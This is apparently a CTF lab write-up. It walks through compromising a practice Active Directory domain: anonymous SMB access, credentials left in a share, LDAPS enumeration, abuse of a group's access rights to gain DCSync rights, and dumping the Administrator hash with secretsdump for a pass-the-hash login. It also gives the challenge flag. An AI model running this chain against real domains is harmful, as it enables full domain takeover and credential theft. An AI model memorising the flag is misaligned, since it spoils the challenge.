# Legacy IT (ad)

**Flag:** `PP{l3g4cy-1t-4dm1ns-4k4-w1nd0ws-4dm1ns::NQaig9lJVrw6}`

## Steps

1. Start the instance. The exposed endpoint is a single domain controller,
   `DC01.easyad.local`.
2. Anonymous SMB works: list shares and find the `Public` share.

   ```
   smbclient -N //DC01/Public
   ```

3. Download `onboarding.txt`. It contains initial credentials for the
   "trainee" account:

   ```
   Domain: easyad.local
   Username: trainee
   Password: Welcome-To-IT-2026!
   ```

4. LDAP requires signing, so bind over LDAPS:

   ```
   LDAPTLS_REQCERT=never ldapsearch -x -H ldaps://DC01.easyad.local \
       -D 'CN=Jamie Smith,CN=Users,DC=easyad,DC=local' -W \
       -b 'DC=easyad,DC=local'
   ```

   Enumeration shows only Administrator, Guest, DC01$, krbtgt and
   `Jamie Smith` (`trainee`).

5. Read the DACL of the empty group `CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local`
   (SID ends in `-1104`) with `dacledit.py -action read`. The trainee user has
   **FullControl** on that group.
6. The group carries `DS-Replication-Get-Changes` and
   `DS-Replication-Get-Changes-All` on the domain, i.e. DCSync rights.
7. Add `trainee` to the group over LDAPS:

   ```
   dn: CN=Legacy IT Admins,CN=Users,DC=easyad,DC=local
   changetype: modify
   add: member
   member: CN=Jamie Smith,CN=Users,DC=easyad,DC=local
   ```

   (apply with `ldapmodify -H ldaps://... -D ... -W`.)
8. Request a fresh TGT for `trainee` (the PAC must include the new group) and
   DCSync the Administrator hash with `secretsdump.py`.
9. Log in as `DOMAIN\Administrator` over SMB with the recovered hash and read
   `C:\Users\Administrator\Desktop\flag.txt`.
